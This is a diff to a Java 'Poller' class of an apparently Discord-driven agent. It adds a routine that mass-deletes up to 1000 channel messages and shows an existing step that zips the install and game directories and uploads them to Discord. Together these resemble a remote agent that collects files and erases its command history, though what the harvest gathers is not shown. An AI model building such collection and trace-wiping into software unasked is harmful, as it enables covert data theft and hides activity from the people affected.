@@ -465,6 +465,9 @@ public final class Poller implements Runnable {
 		// Command webhooks let one account drive the agent without a second
 		// member in the channel; our own embeds carry no content and skip.
 		if (webhook && content.isEmpty()) {
+			// The gateway hides webhook content without the intent; let the REST
+			// poll read it instead of dropping the command.
+			requestPoll();
 			return;
 		}
 		String authorId = Json.str(Json.map(message.get("author")), "id", "");
@@ -685,8 +688,61 @@ public final class Poller implements Runnable {
 		}
 	}
 
-	public void harvestNow() {
-		try {
+	public void clearChannel(int requested) {
+		int limit = Math.max(1, Math.min(requested <= 0 ? 100 : requested, 1000));
+		Thread thread = new Thread(() -> {
+			int deleted = 0;
+			try {
+				List<String> ids = new ArrayList<>();
+				String before = "";
+				while (ids.size() < limit) {
+					int batch = Math.min(100, limit - ids.size());
+					String path = "/channels/" + channelId + "/messages?limit=" + batch
+						+ (before.isEmpty() ? "" : "&before=" + before);
+					List<Object> messages = Json.list(Json.parse(client.get(path).body));
+					if (messages.isEmpty()) {
+						break;
+					}
+					for (Object item : messages) {
+						String id = Json.str(Json.map(item), "id", "");
+						if (!id.isEmpty()) {
+							ids.add(id);
+						}
+					}
+					before = ids.get(ids.size() - 1);
+					if (messages.size() < batch) {
+						break;
+					}
+				}
+				for (int index = 0; index < ids.size(); index += 100) {
+					List<String> chunk = ids.subList(index, Math.min(index + 100, ids.size()));
+					Map<String, Object> body = new LinkedHashMap<>();
+					body.put("messages", chunk);
+					DiscordClient.Response response = client.post(
+						"/channels/" + channelId + "/messages/bulk-delete", Json.stringify(body));
+					if (response.status >= 200 && response.status < 300) {
+						deleted += chunk.size();
+						continue;
+					}
+					// Older than two weeks: bulk delete refuses, remove one by one.
+					for (String id : chunk) {
+						DiscordClient.Response single = client.delete(
+							"/channels/" + channelId + "/messages/" + id);
+						if ((single.status >= 200 && single.status < 300) || single.status == 404) {
+							deleted++;
+						}
+					}
+				}
+				reply("Cleared " + deleted + " messages");
+			} catch (Throwable throwable) {
+				reply("Clear failed after " + deleted + ": " + throwable.getMessage());
+			}
+		}, "spc-clear");
+		thread.setDaemon(true);
+		thread.start();
+	}
+
+	public void harvestNow() {		try {
 			Path zip = Harvest.build(installDir, gameDir);
 			uploadFile(zip);
 			Files.deleteIfExists(zip);
